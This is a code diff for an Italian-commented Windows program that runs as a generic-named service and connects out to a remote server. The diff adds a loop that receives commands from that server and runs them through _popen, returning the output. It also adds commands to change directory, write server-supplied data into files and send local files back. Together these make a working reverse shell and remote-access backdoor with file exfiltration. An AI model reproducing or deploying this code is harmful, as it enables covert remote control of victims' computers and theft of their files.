@@ -13,6 +13,7 @@
 #include <ws2tcpip.h>
 #include <stdlib.h>
 #include <strsafe.h>
+#include <direct.h>
 
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
@@ -30,12 +31,18 @@ HANDLE                g_ServiceStopEvent = INVALID_HANDLE_VALUE;
 VOID WINAPI ServiceMain(DWORD argc, LPTSTR *argv);
 VOID WINAPI ServiceCtrlHandler(DWORD);
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
-//void startConnection();
+
 void mainConnessioneAlServer();
 void invia(SOCKET socketConnessione, char* messaggio);
 char* riceviStringa(SOCKET socketConnessione, char *recvbuf);
 void inizializzaConnessione(SOCKET *ConnectSocket);
 void chiudiConnessione(SOCKET ConnectSocket);
+
+int ottieniComando(char *comando);
+void setCartellaCorrente(char* path, char* dirCorrente);
+void getCartellaCorrente(char* temp);
+
+//void test();
 
 #define SERVICE_NAME  _T("My Sample Service")
 
@@ -49,6 +56,8 @@ int _tmain(int argc, char *argv[])
 		*/
 		if (argv[1][0] == 'c') {
 			mainConnessioneAlServer();
+		}else if (argv[1][0] == 't') {
+			//test();
 		}
 	}
 	// In this case is the main service starting.
@@ -72,19 +81,126 @@ int _tmain(int argc, char *argv[])
 	Main function to manage connection to the remote server.
 */
 void mainConnessioneAlServer() {
-	char buffer[DEFAULT_BUFLEN];
-
+	//Used for connection
 	SOCKET socketConnessione = INVALID_SOCKET;
+
+	//User for shell control
+	char path[DEFAULT_BUFLEN], comando[DEFAULT_BUFLEN], buffer[DEFAULT_BUFLEN];
+	FILE *read;
 
 	inizializzaConnessione(&socketConnessione);
 
+	getCartellaCorrente(path);
+
 	while (true) {
-		invia(socketConnessione, "Inivia un comando: ");
+		//send
+		invia(socketConnessione, path);
 		invia(socketConnessione, "end");
-		printf("\n[RCV]: %s\n\n", riceviStringa(socketConnessione, buffer));
+
+		//recive
+		riceviStringa(socketConnessione, comando);
+		printf("\n[RCV]: %s\n\n", comando);
+		int cmdN = ottieniComando(comando);
+		if (cmdN == 1) {	  //Change Dir
+			setCartellaCorrente(comando, path);
+		}
+		else if (cmdN == 2) { //Upload to client
+			char* fileName = &comando[3];
+			FILE *file;
+			int e = fopen_s(&file, fileName, "a");
+			if (e == 0) {
+				invia(socketConnessione, "Per ora è possibile mandare solo 512 char senza invio - da migliorare: ");
+				invia(socketConnessione, "end");
+				riceviStringa(socketConnessione, buffer);
+				fputs(buffer, file);
+				invia(socketConnessione, "File scritto con successo.");
+				fclose(file);
+			}
+			else {
+				invia(socketConnessione, "Impossibile aprire il file");
+			}
+		}
+		else if (cmdN == 3) { //Downlaod from client
+			char* fileName = &comando[3];
+			FILE *file;
+			int e = fopen_s(&file, fileName, "r");
+			if (e == 0) {
+				invia(socketConnessione, "Inviando il file: ");
+				invia(socketConnessione, fileName);
+				invia(socketConnessione, "\n");
+				while (fgets(buffer, DEFAULT_BUFLEN, file)) {
+					invia(socketConnessione, buffer);
+				}
+				fclose(file);
+			}
+			else {
+				invia(socketConnessione, "Impossibile aprire il file");
+			}
+		}
+		else {
+			if ((read = _popen(comando, "rt")) == NULL)
+				exit(1);
+			while (fgets(buffer, DEFAULT_BUFLEN, read)) {
+				invia(socketConnessione, buffer);
+				printf(buffer);
+			}
+			_pclose(read);
+		}
 	}
 
 	chiudiConnessione(socketConnessione);
+}
+
+/*
+	Used to check if it's needed to change process working dir.
+	IN wchar_t *comando - Command to check.
+	Return:
+		0 - Standard command
+		1 - Change directory command
+		2 - Upload file command
+		3 - Download file command
+*/
+int ottieniComando(char *comando) {
+	if (strlen(comando) > 3) {
+		if (comando[0] == 'c' && comando[1] == 'd') {
+			return 1;
+		}
+		else if (comando[0] == 'u' && comando[1] == 'p') {
+			return 2;
+		}
+		else if (comando[0] == 'd' && comando[1] == 'w') {
+			return 3;
+		}
+	}
+	return 0;
+}
+
+/*
+	To get current directory.
+*/
+void getCartellaCorrente(char* temp) {
+	size_t size;
+	LPWSTR dirCorrente = new TCHAR[DEFAULT_BUFLEN];
+	GetCurrentDirectory(DEFAULT_BUFLEN, dirCorrente);
+	size = wcslen(dirCorrente);
+	wcstombs_s(NULL, temp, DEFAULT_BUFLEN, dirCorrente, size);
+}
+
+/*
+	To change current directory while navigating.
+*/
+void setCartellaCorrente(char* relative, char* dirCorrente) {
+
+	if (strlen(relative) >= 5 && relative[4] == ':') {
+		strcpy_s(dirCorrente, DEFAULT_BUFLEN, &relative[3]);
+	}
+	else {
+		getCartellaCorrente(dirCorrente);
+		relative[2] = '\\';
+		strcat_s(dirCorrente, DEFAULT_BUFLEN, &relative[2]);
+	}
+	int i = _chdir(dirCorrente);
+	getCartellaCorrente(dirCorrente);
 }
 
 /*
